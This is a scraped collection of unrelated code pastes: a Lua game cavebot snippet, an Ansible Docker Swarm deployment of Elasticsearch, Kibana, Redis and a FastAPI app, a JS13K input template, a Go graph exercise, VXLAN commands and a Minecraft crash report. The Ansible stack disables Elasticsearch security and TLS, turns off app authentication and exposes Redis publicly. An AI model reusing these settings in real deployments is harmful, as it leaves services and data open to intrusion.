local whitelistMonsters = { ""big dinozaur"", ""elite hobo"", ""big bandit"", ""infected saibamen"", ""mystic namekjin"", ""mystic cooler"", ""ultra namekjin"", ""golden cell"", ""gold cell"", ""gold majin"", ""gold namekjin"", ""mystic janemba"", ""mystic shin"", ""mystic jiren"", ""fury bardock"", ""mystic uub"", ""mystic machin"", ""mystic invader"", ""legendary saiyan"", ""mystic tsuful"", ""mystic tenshin"", ""espinor"", ""ultra warrior"", ""evil legendary tsuful"", ""dark kenny"", ""strong legendary krillin"", ""strong ice dragon"", ""strong fire dragon"", ""dabura"", ""doton ninja"", ""king emeads"", ""ivision"", ""ultra tapion"", ""ultra  majin"", ""strong ancient bandit"", ""strong xicor"", ""strong brolly"", ""gogeta ssj4"", ""gold janemba"", ""gold beerus"", ""explosive barrel"", ""dr gero"", ""fire ball""}

local creatureCount = 0

for _, mob in ipairs(getSpectators(posz())) do

    if mob:isMonster() and table.find(whitelistMonsters, mob:getName():lower()) then

        creatureCount = creatureCount + 1

    end

end

if creatureCount >= minMonsters then

    CaveBot.gotoLabel(""bossAlive"")

    CaveBot.delay(5000)

end

return creatureCount >= minMonsters


]]"
kx1Cx9c9,Untitled,excuseem,YAML,Tuesday 17th of June 2025 07:52:44 AM CDT,"---

- name: Deploy elasticsearch and Kibana
  docker_stack:
    state: present
    name: cinevoy
    prune: yes
    resolve_image: always
    with_registry_auth: yes
    compose:
      - version: ""3.8""
        services:
          elasticsearch:
            image: ""docker.elastic.co/elasticsearch/elasticsearch:{{ ELASTICSEARCH_APP.STACK_VERSION }}""
            deploy:
              mode: global
              update_config:
                parallelism: 1
                order: stop-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.elasticsearch == node
            volumes:
              - ""es-data:/usr/share/elasticsearch/data""
            networks:
              - network_1
            ports:
              - ""{{ ELASTICSEARCH_APP.ES_PORT }}:9200""
            environment:
              - ""discovery.type=single-node""

              #              - node.name={{ inventory_hostname }}
              #              - cluster.name={{ ELASTICSEARCH_APP.CLUSTER_NAME }}
              #              - cluster.initial_master_nodes=cinevoy_elasticsearch
              #              - discovery.seed_hosts=cinevoy_elasticsearch
              - ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}
              - bootstrap.memory_lock=true
              - xpack.security.enabled=false
              - xpack.security.http.ssl.enabled=false
              - xpack.security.transport.ssl.enabled=false
              - xpack.license.self_generated.type={{ ELASTICSEARCH_APP.LICENSE }}
              - http.cors.enabled=true
              - http.cors.allow-origin=http://localhost:8080
            ulimits:
              memlock:
                soft: -1
                hard: -1
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl http://localhost:9200 | grep -q 'You Know, for Search'"",
                ]
              interval: 10s
              timeout: 10s
              retries: 120

          kibana:
            depends_on:
              - elasticsearch
            image: ""docker.elastic.co/kibana/kibana:{{ ELASTICSEARCH_APP.STACK_VERSION }}""
            deploy:
              mode: global
              update_config:
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.kibana == node
            volumes:
              - kibana-data:/usr/share/kibana/data
            networks:
              - network_1
            ports:
              - ""{{ ELASTICSEARCH_APP.KIBANA_PORT }}:5601""
            environment:
              - ""SERVERNAME=kibana""
              - ""ELASTICSEARCH_HOSTS=http://cinevoy_elasticsearch:9200""
              - ""ELASTICSEARCH_USERNAME=kibana_system""
              - ""ELASTICSEARCH_PASSWORD={{ ELASTICSEARCH_APP.KIBANA_PASSWORD }}""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -s -I http://localhost:5601 | grep -q 'HTTP/1.1 302 Found'"",
                ]
              interval: 10s
              timeout: 10s
              retries: 120

          elasticvue:
            image: ""cars10/elasticvue""
            deploy:
              mode: replicated
              replicas: 1
              update_config:
                parallelism: 1
                order: start-first
                failure_action: rollback
                delay: 10s
            ports:
              - ""8080:8080""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -f -s http://localhost:8080 || exit 1"",
                ]
              start_period: 10s
              interval: 10s
              timeout: 10s
              retries: 20

          redis:
            image: redis:6.2.13-alpine3.18
            deploy:
              mode: global
              resources:
                limits:
                  memory: 6G
              update_config:
                parallelism: 1
                order: stop-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.redis == node
            command: redis-server --maxmemory 5gb --maxmemory-policy volatile-lru
            volumes:
              - redis-data:/data
            networks:
              - network_1
            ports:
              - ""6379:6379""
            healthcheck:
              test: [ ""CMD"", ""redis-cli"", ""--raw"", ""incr"", ""ping"" ]
              interval: 2s
              timeout: 2s
              retries: 60

          fastapi:
            depends_on:
              - elasticsearch
            image: ""{{ CINEVOY_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 4
              update_config:
                parallelism: 2
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            networks:
              - network_1
            ports:
              - ""8000:8000""
            environment:
              - ""CSB_REDIS_URL=redis://redis:6379/""
              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
              - ""CSB_ELASTIC_USER=elastic""
              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
              - ""CSB_AUTH_ENABLE=False""
              - ""CSB_AUTH_USERNAME={{ AUTH_USERNAME }}""
              - ""CSB_AUTH_PASSWORD={{ AUTH_PASSWORD }}""
              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
              - ""CSB_SENTRY_IS_ENABLE=true""
              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
              - ""CSB_JWT_SECRET_KEY={{ JWT_SECRET_KEY }}""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -u {{ AUTH_USERNAME }}:{{AUTH_PASSWORD }} -f -s http://localhost:8000/health/ || exit 1"",
                ]
              interval: 10s
              timeout: 10s
              retries: 5

#          celery_worker:
#            image: ""{{ CINEVOY_IMAGE }}""
#            deploy:
#              mode: replicated
#              replicas: 1
#              update_config:
#                parallelism: 1
#                order: stop-first
#                failure_action: rollback
#                delay: 10s
#              placement:
#                constraints:
#                  - node.labels.fastapi == node
#            command: celery -A searchbox.worker.app worker -Q default --loglevel=INFO --concurrency=1
#            depends_on:
#              - redis
#            networks:
#              - network_1
#            environment:
#              - ""CSB_REDIS_URL=redis://redis:6379/""
#              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
#              - ""CSB_ELASTIC_USER=elastic""
#              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
#              - ""CSB_KP_DEV_API_KEY={{ ELASTICSEARCH_APP.KP_DEV_API_KEY }}""
#              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
#              - ""CSB_MYSQL_HOST={{ MYSQL_HOST }}""
#              - ""CSB_MYSQL_DB={{ MYSQL_DB }}""
#              - ""CSB_MYSQL_USER={{ MYSQL_USER }}""
#              - ""CSB_MYSQL_PASSWORD={{ MYSQL_PASSWORD }}""
#              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
#              - ""CSB_SENTRY_IS_ENABLE=true""
#              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""celery -A searchbox.worker.app inspect ping --destination celery@$$HOSTNAME"",
#                ]
#              start_period: 10s
#              interval: 10s
#              timeout: 10s
#              retries: 20
#
#          celery_worker_multithread:
#            image: ""{{ CINEVOY_IMAGE }}""
#            deploy:
#              mode: replicated
#              replicas: 4
#              update_config:
#                parallelism: 2
#                order: start-first
#                failure_action: rollback
#                delay: 10s
#              placement:
#                constraints:
#                  - node.labels.fastapi == node
#            command: celery -A searchbox.worker.app worker -Q multithread --loglevel=INFO --concurrency=1
#            depends_on:
#              - redis
#            networks:
#              - network_1
#            environment:
#              - ""CSB_REDIS_URL=redis://redis:6379/""
#              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
#              - ""CSB_ELASTIC_USER=elastic""
#              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
#              - ""CSB_KP_DEV_API_KEY={{ ELASTICSEARCH_APP.KP_DEV_API_KEY }}""
#              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
#              - ""CSB_MYSQL_HOST={{ MYSQL_HOST }}""
#              - ""CSB_MYSQL_DB={{ MYSQL_DB }}""
#              - ""CSB_MYSQL_USER={{ MYSQL_USER }}""
#              - ""CSB_MYSQL_PASSWORD={{ MYSQL_PASSWORD }}""
#              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
#              - ""CSB_SENTRY_IS_ENABLE=true""
#              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""celery -A searchbox.worker.app inspect ping --destination celery@$$HOSTNAME"",
#                ]
#              start_period: 10s
#              interval: 10s
#              timeout: 10s
#              retries: 20

          celery_flower:
            image: ""{{ CINEVOY_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 1
              update_config:
                parallelism: 1
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            command: celery -A searchbox.worker.app flower --loglevel=DEBUG
            depends_on:
              - redis
              - celery_worker
            networks:
              - network_1
            ports:
              - ""5555:5555""
            environment:
              - ""CSB_REDIS_URL=redis://redis:6379/""
              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
              - ""CSB_ELASTIC_USER=elastic""
              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
              - ""CSB_SENTRY_IS_ENABLE=true""
              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -f -s http://localhost:5555/ || exit 1"",
                ]
              interval: 10s
              timeout: 10s
              retries: 5


#          cron_scheduler:
#            image: ""{{ CINEVOY_IMAGE }}""
#            deploy:
#              mode: replicated
#              replicas: 1
#              update_config:
#                parallelism: 1
#                order: stop-first
#                failure_action: pause
#                delay: 10s
#              placement:
#                constraints:
#                  - node.labels.fastapi == node
#            command: python searchbox/cron_scheduler/main.py
#            depends_on:
#              - redis
#            networks:
#              - network_1
#            environment:
#              - ""CSB_REDIS_URL=redis://redis:6379/""
#              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
#              - ""CSB_ELASTIC_USER=elastic""
#              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
#              - ""CSB_KP_DEV_API_KEY={{ ELASTICSEARCH_APP.KP_DEV_API_KEY }}""
#              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
#              - ""CSB_MYSQL_HOST={{ MYSQL_HOST }}""
#              - ""CSB_MYSQL_DB={{ MYSQL_DB }}""
#              - ""CSB_MYSQL_USER={{ MYSQL_USER }}""
#              - ""CSB_MYSQL_PASSWORD={{ MYSQL_PASSWORD }}""
#              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
#              - ""CSB_SENTRY_IS_ENABLE=true""
#              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""sh searchbox/cron_scheduler/check_socket_health.sh"",
#                ]
#              start_period: 10s
#              interval: 10s
#              timeout: 10s
#              retries: 20

          web:
            image: ""{{ CINEVOY_WEB_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 1
              update_config:
                parallelism: 1
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            ports:
              - ""8001:80""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -f -s -u {{ DEMO_USER }}:{{ DEMO_PASSWORD }} http://localhost:80/ || exit 1"",
                ]
              interval: 10s
              timeout: 10s
              retries: 5

          webplayer:
            image: ""{{ CINEVOY_WEBPLAYER_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 1
#              update_config:
#                parallelism: 1
#                order: start-first
#                failure_action: rollback
#                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            ports:
              - ""8002:3000""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""curl -f -s http://localhost:3000/ || exit 1"",
#                ]
#              interval: 10s
#              timeout: 10s
#              retries: 5

        networks:
          network_1:
            driver: overlay
            attachable: true

        volumes:
          es-data:
            driver: local
          kibana-data:
            driver: local
          redis-data:
            driver: local

  when: inventory_hostname in groups['eks'][0]
"
BBn0F47K,Untitled,rubiin,JavaScript,Tuesday 17th of June 2025 07:30:26 AM CDT,"https://www.youtube.com/shorts/4A18ok8LXoo


how to use
 https://www.youtube.com/watch?v=8ee03NcrmVQ&t=29s

5-10 mins per session
4-5 hours before wash


https://tressless.com/learn/microneedling"
wL16HmS5,JS13K 2025 - Input v0.1,Alex_ADEdge,JavaScript,Tuesday 17th of June 2025 06:51:28 AM CDT,"<!-- JS13K, 2025, By AlexDeltaDev twitter.com/Alex_ADEdge -->
<!-- Based on this mapping by XEM: https://xem.github.io/articles/jsgamesinputs.html -->
<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>JS13K-Warmup-Template</title>
        <style> 
            html, body {
                width: 100%;
                height: 100%;
                touch-action: none;
                overflow: hidden;
                display: flex;
                justify-content: center;
                align-items: center;  
                background-color: #272744;
            }
            #title {
                position: absolute; 
                bottom: 3px; 
                left: 25px; 
                color: aliceblue;
                font-family: ""Lucida Console"", ""Courier New"", monospace;
            }
            #title2 {
                position: absolute; 
                bottom: 24px; 
                left: 25px; 
                color: aliceblue;
                font-family: ""Lucida Console"", ""Courier New"", monospace;
            }
            canvas {
                display: block;
                margin: auto;
                /* cursor: none; */
                background-color: #111111;
            }
            @media only screen and (min-device-width: 320px) and (max-device-width: 768px) and (orientation: portrait) {
                canvas {
                    transform: rotate(90deg);
                    transform-origin: center center;
                }
            }
        </style>
        <!-- <link rel=""stylesheet"" href=""style.css""> -->
        <!-- <script src=""https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js""></script> -->
        <!-- <script type=""module"" src=""./src/main.js""></script> -->
        <script>       
            var up = false, right = false, down = false, left = false; // keyboard values
            var c_up = false, c_right = false, c_down = false, c_left = false; // controller values
            // Baseline variables 
            var mobile, app, cvs, cx, w, h, asp, asp2, rect, rng, seed, mouseX, mouseY;
            // Scalings
            var w2 = 960; var h2 = 540;
            // Toggles
            var debug = true;
            var webGL = true;
            //GamePad
            var gp = navigator.getGamepads()[0];

            // App Setup
            window.onload = function() 
            {
                initSetup();
            }

            function initSetup() 
            {
                console.log(""Initilizing..."");
                cvs = document.getElementById('cvs');
                cx = cvs.getContext(""2d"");
                w = cvs.clientWidth;
                h = cvs.clientHeight;
                asp = w/h; // Aspect ratio of window
                asp2 = w2/h2; // Aspect ratio of inner cvs
                
                cx.imageSmoothingEnabled = false; // gritty
                
                // setup listeners, check for game controller
                setupEventListeners(cvs);
                if (!gp) { console.log(""Gamepad not found (press a button on the controller to connect)""); }

                tick();
            }

            function tick(timestamp) 
            {
                cx.clearRect(0, 0, w, h);
                
                // Update gamepad state every loop
                gp = navigator.getGamepads()[0];
                if (gp) {
                    checkGamePad();
                }

                // Draw debug outputs to cavans
                cx.font = '16px monospace';
                cx.fillStyle = '#fff';
                if(up || c_up) { cx.fillStyle = '#3f3'; }
                cx.fillText('Up: ' + (up || c_up), 10, 30);

                cx.fillStyle = '#fff';
                if(down || c_down) { cx.fillStyle = '#3f3'; }
                cx.fillText('Down: ' + (down || c_down), 10, 50);

                cx.fillStyle = '#fff';
                if(left || c_left) { cx.fillStyle = '#3f3'; }
                cx.fillText('Left: ' + (left || c_left), 10, 70);

                cx.fillStyle = '#fff';
                if(right || c_right) { cx.fillStyle = '#3f3'; }
                cx.fillText('Right: ' + (right || c_right), 10, 90);

                // Request next frame, ie r loop
                requestAnimationFrame(tick);
            }

            // Keydown listener
            onkeydown = (e) => {
                const k = e.key.toLowerCase();
                // Up (up / W / Z)
                if (k === ""arrowup"" || k === ""w"" || k === ""z"") up = true;
                // Right (right / D)
                if (k === ""arrowright"" || k === ""d"") right = true;
                // Down (down / S)
                if (k === ""arrowdown"" || k === ""s"") down = true;
                // Left (left / A / Q)
                if (k === ""arrowleft"" || k === ""a"" ||k === ""q"") left = true;
                // console.log(""E: "" + e.key);
            }

            // Keyup listener
            onkeyup = (e) => {
                const k = e.key.toLowerCase();
                // Up
                if (k === ""arrowup"" || k === ""w"" || k === ""z"") up = false;
                // Right
                if (k === ""arrowright"" || k === ""d"") right = false;
                // Down
                if (k === ""arrowdown"" || k === ""s"") down = false;
                // Left
                if(k === ""arrowleft"" || k === ""a"" || k === ""q"") left = false;
                // console.log(""UP: "" + up);
            }

            function checkGamePad() {
                const b = gp.buttons;
                //debug all buttons
                // console.log(JSON.stringify(gp.buttons.map(b => b.value), null, 2));
                // b.forEach((btn, index) => {
                //     if (btn.pressed) console.log(""Button pressed:"", index);
                // });

                // D-Pad buttons
                c_up    = b[12]?.pressed;
                c_down  = b[13]?.pressed;
                c_left  = b[14]?.pressed;
                c_right = b[15]?.pressed;
        
                // Left stick test
                const lx = gp.axes[0], ly = gp.axes[1];
                if (lx < -0.5) c_left = true;
                if (lx >  0.5) c_right = true;
                if (ly < -0.5) c_up = true;
                if (ly >  0.5) c_down = true;
            }

            function setupEventListeners(c) {
                // Keyboard (WASD/ZQSD/Arrows) Events
                c.addEventListener('keydown', onkeydown);
                c.addEventListener('keyup', onkeyup);

                // Gamepad/Controller Events
                window.addEventListener(""gamepadconnected"", (e) => {
                    // console.log(""Gamepad connected:"", e.gamepad);
                    console.log(
                        ""Gamepad connected at index %d: %s. %d buttons, %d axes."",
                        e.gamepad.index,
                        e.gamepad.id,
                        e.gamepad.buttons.length,
                        e.gamepad.axes.length,
                    );
                    gp = navigator.getGamepads()[0];
                });
                window.addEventListener(""gamepaddisconnected"", e => {
                    console.log(""Gamepad disconnected:"", e.gamepad.id);
                });

                // Mouse/Touch Events
                c.addEventListener('pointermove', (e) => {
                    // console.log(""pointermove"");
                });
                c.addEventListener('pointerdown', (e) => {
                    // console.log(""pointerdown"");
                });
                c.addEventListener('pointerup', (e) => {
                    // console.log(""pointerup"");
                });
                c.addEventListener('pointercancel', (e) => {
                    // The same as pointer up, but for mobile specific cases
                    // console.log(""pointercancel"");
                });
            }
        </script>
    </head>
    <body>
        <h3 id=""title"">JS13K 2025 (Warmup/Template)</h3>
        <p id=""title2"">v.0.0-</p>
        <canvas id=""cvs"" width=""960"" height=""540""></canvas>
    </body>
</html>"
uBKPMPcU,QuestionGetAncestors,gautamhitesh,Go,Tuesday 17th of June 2025 06:36:42 AM CDT,"package main

import ""fmt""

type Services interface {
	AddService(service int, dependency int)
	GetAncestors(service int, depth int)
}

type ServiceManager struct {
	servicemap map[int][]int
}

func (servicemanager *ServiceManager) AddService(service, dependency int) {
	servicemanager.servicemap[service] = append(servicemanager.servicemap[service], dependency)
}

func (serviceManager *ServiceManager) GetAncestors(service, depth int) []int { //added depth
	visited := make(map[int]bool) //to avoid dupicate results
	var res []int
	var dfs func(service, depth int)
	dfs = func(service, depth int) {
		if depth == 0 {
			return
		}
		for _, dep := range serviceManager.servicemap[service] {
			if !visited[dep] {
				visited[dep] = true
				res = append(res, dep)
				dfs(dep, depth-1)
			}
		}
	}

	dfs(service, depth)
	return res
}

func main() {
	serviceManager := &ServiceManager{
		servicemap: make(map[int][]int),
	}
	serviceManager.AddService(0, 1)
	serviceManager.AddService(1, 2)
	fmt.Println(serviceManager.GetAncestors(0, 1))
	serviceManager.AddService(0, 3)
	serviceManager.AddService(3, 4)
	fmt.Println(serviceManager.GetAncestors(0, 2))
}
"
aPC5FpeH,Untitled,Nemesiz,Bash,Tuesday 17th of June 2025 06:31:51 AM CDT,"ip link add vxb1 type vxlan id 5000 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6000
ip link add vxb2 type vxlan id 5001 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6001
ip link add vxb3 type vxlan id 5002 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6002
ip link add vxb4 type vxlan id 5003 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6003

ip link set vxb1 up
ip link set vxb2 up
RTNETLINK answers: Address already in use
ip link set vxb3 up
ip link set vxb4 up
"
qJuLLSZE,Untitled,Quantum_Rage,Java,Tuesday 17th of June 2025 06:18:15 AM CDT,"---- Minecraft Crash Report ----
// I bet Cylons wouldn't have this problem.

Time: 2025-06-17 20:49:05
Description: Exception ticking world

java.lang.UnsupportedOperationException
	at knot//com.google.common.collect.ImmutableCollection.add(ImmutableCollection.java:264)
	at knot//net.minecraft.class_2852.mdc9645b$protosky$lambda$deserialize_graces$0$1(class_2852.java:2098)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at knot//net.minecraft.class_2852.modifyReturnValue$cdj000$protosky$deserialize_graces(class_2852.java:2097)
	at knot//net.minecraft.class_2852.method_12395(class_2852.java:241)
	at knot//net.minecraft.class_3898.mdc9645b$c2me-threading-chunkio$lambda$loadChunk$3$1c(class_3898.java:9076)
	at java.base/java.util.concurrent.CompletableFuture$UniApply.tryFire(CompletableFuture.java:646)
	at java.base/java.util.concurrent.CompletableFuture$Completion.run(CompletableFuture.java:482)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
	at java.base/java.lang.Thread.run(Thread.java:840)


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- Head --
Thread: Server thread
Stacktrace:
	at knot//com.google.common.collect.ImmutableCollection.add(ImmutableCollection.java:264)
	at knot//net.minecraft.class_2852.mdc9645b$protosky$lambda$deserialize_graces$0$1(class_2852.java:2098)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at knot//net.minecraft.class_2852.modifyReturnValue$cdj000$protosky$deserialize_graces(class_2852.java:2097)
	at knot//net.minecraft.class_2852.method_12395(class_2852.java:241)

-- Affected level --
Details:
	All players: 1 total; [class_3222['Quantum_rage'/3, l='ServerLevel[New World]', x=8.50, y=80.19, z=8.50]]
	Chunk stats: 21556
	Level dimension: aether:the_aether
	Derived: true
	Level spawn location: World: (8,64,8), Section: (at 8,0,8 in 0,4,0; chunk contains blocks 0,0,0 to 15,255,15), Region: (0,0; contains chunks 0,0 to 31,31, blocks 0,0,0 to 511,255,511)
	Level time: 1193 game time, 1193 day time
	Level name: New World
	Level game mode: Game mode: creative (ID 1). Hardcore: false. Cheats: true
	Level weather: Rain time: 136000 (now: false), thunder time: 92793 (now: false)
	Known server brands: fabric
	Removed feature flags: 
	Level was modded: true
	Level storage version: 0x04ABD - Anvil
Stacktrace:
	at knot//net.minecraft.server.MinecraftServer.method_3813(MinecraftServer.java:900)
	at knot//net.minecraft.server.MinecraftServer.method_3748(MinecraftServer.java:824)
	at knot//net.minecraft.class_1132.method_3748(class_1132.java:105)
	at knot//net.minecraft.server.MinecraftServer.method_29741(MinecraftServer.java:671)
	at knot//net.minecraft.server.MinecraftServer.method_29739(MinecraftServer.java:265)
	at java.base/java.lang.Thread.run(Thread.java:840)

-- System Details --
Details:
	Minecraft Version: 1.20.1
	Minecraft Version ID: 1.20.1
	Operating System: Windows 10 (amd64) version 10.0
	Java Version: 17.0.15, Microsoft
	Java VM Version: OpenJDK 64-Bit Server VM (mixed mode), Microsoft
	Memory: 1377303928 bytes (1313 MiB) / 3674210304 bytes (3504 MiB) up to 10301210624 bytes (9824 MiB)
	CPUs: 32
	Processor Vendor: AuthenticAMD
	Processor Name: AMD Ryzen 9 5950X 16-Core Processor            
	Identifier: AuthenticAMD Family 25 Model 33 Stepping 0
	Microarchitecture: Zen 3
	Frequency (GHz): 3.40
	Number of physical packages: 1
	Number of physical CPUs: 16
	Number of logical CPUs: 32
	Graphics card #0 name: AMD Radeon RX 6900 XT
	Graphics card #0 vendor: Advanced Micro Devices, Inc. (0x1002)
	Graphics card #0 VRAM (MB): 4095.00
	Graphics card #0 deviceId: 0x73bf
	Graphics card #0 versionInfo: DriverVersion=32.0.21013.1000
	Memory slot #0 capacity (MB): 32768.00
	Memory slot #0 clockSpeed (GHz): 2.40
	Memory slot #0 type: DDR4
	Memory slot #1 capacity (MB): 32768.00
	Memory slot #1 clockSpeed (GHz): 2.40
	Memory slot #1 type: DDR4
	Memory slot #2 capacity (MB): 32768.00
	Memory slot #2 clockSpeed (GHz): 2.40
	Memory slot #2 type: DDR4
	Memory slot #3 capacity (MB): 32768.00
	Memory slot #3 clockSpeed (GHz): 2.40
	Memory slot #3 type: DDR4
	Virtual memory max (MB): 220084.58
	Virtual memory used (MB): 68004.19
	Swap memory total (MB): 89088.00
	Swap memory used (MB): 818.66
	JVM Flags: 22 total; -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xss1M -Xmx9824m -Xms256m -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1
	Fabric Mods: 
		accessories: Accessories 1.0.0-beta.47+1.20.1
			io_wispforest_endec: endec 0.1.8
			io_wispforest_endec_gson: gson 0.1.5
			io_wispforest_endec_netty: netty 0.1.4
		aether: The Aether 1.5.2-beta.6
			cardinal-components-base: Cardinal Components API (base) 5.2.2
			cardinal-components-entity: Cardinal Components API (entities) 5.2.2
			cardinal-components-world: Cardinal Components API (worlds) 5.2.2
			cumulus_menus: Cumulus 1.20.1-1.0.1-fabric
			mm_shedaniel: Manningham Mills (shedaniel's fork) 2.4.1
			nitrogen_internals: Nitrogen 1.20.1-1.0.15-fabric
			porting_lib_asm: Porting Lib ASM 2.3.9-beta.51+1.20.1
			porting_lib_base: Porting Lib Base 2.3.9-beta.52+1.20.1
				com_electronwill_night-config_core: core 3.6.6
				com_electronwill_night-config_toml: toml 3.6.6
				porting_lib_accessors: Porting Lib Accessors 2.3.9-beta.52+1.20.1
				porting_lib_attributes: Porting Lib Attributes 2.3.9-beta.52+1.20.1
				porting_lib_common: Porting Lib Common 2.3.9-beta.52+1.20.1
				porting_lib_config: Porting Lib Config 2.3.9-beta.52+1.20.1
				porting_lib_core: Porting Lib Core 2.3.9-beta.52+1.20.1
				porting_lib_entity: Porting Lib Entity 2.3.9-beta.52+1.20.1
				porting_lib_extensions: Porting Lib Extensions 2.3.9-beta.52+1.20.1
				porting_lib_fluids: Porting Lib Fluids 2.3.9-beta.52+1.20.1
				porting_lib_gui_utils: Porting Lib Gui Utils 2.3.9-beta.52+1.20.1
				porting_lib_lazy_registration: Porting Lib Lazy Register 2.3.9-beta.52+1.20.1
				porting_lib_mixin_extensions: Porting Lib Mixin Extensions 2.3.9-beta.52+1.20.1
				porting_lib_tool_actions: Porting Lib Tool Actions 2.3.9-beta.52+1.20.1
				porting_lib_transfer: Porting Lib Transfer 2.3.9-beta.52+1.20.1
				porting_lib_utility: Porting Lib Utility 2.3.9-beta.52+1.20.1
				reach-entity-attributes: Reach Entity Attributes 2.4.0
			porting_lib_blocks: Porting Lib Blocks 2.3.9-beta.51+1.20.1
			porting_lib_brewing: Porting Lib Brewing 2.3.9-beta.51+1.20.1
			porting_lib_client_events: Porting Lib Client Events 2.3.9-beta.51+1.20.1
			porting_lib_data: Porting Lib Data 2.3.9-beta.51+1.20.1
			porting_lib_items: Porting Lib Items 2.3.9-beta.51+1.20.1
			porting_lib_level_events: Porting Lib Level Events 2.3.9-beta.51+1.20.1
			porting_lib_loot: Porting Lib Loot 2.3.9-beta.51+1.20.1
			porting_lib_model_generators: Porting Lib Model Generators 2.3.9-beta.51+1.20.1
				porting_lib_model_materials: Porting Lib Model Materials 2.3.9-beta.51+1.20.1
			porting_lib_model_loader: Porting Lib Model Loader 2.3.9-beta.51+1.20.1
			porting_lib_models: Porting Lib Models 2.3.9-beta.51+1.20.1
			porting_lib_networking: Porting Lib Networking 2.3.9-beta.51+1.20.1
			porting_lib_recipe_book_categories: Porting Lib Recipe Book Categories 2.3.9-beta.51+1.20.1
			porting_lib_tags: Porting Lib Tags 3.0
		c2me: Concurrent Chunk Management Engine 0.2.0+alpha.11.16
			c2me-base: Concurrent Chunk Management Engine (Base) 0.2.0+alpha.11.16
			c2me-client-uncapvd: Concurrent Chunk Management Engine (Client/Uncap View Distance) 0.2.0+alpha.11.16
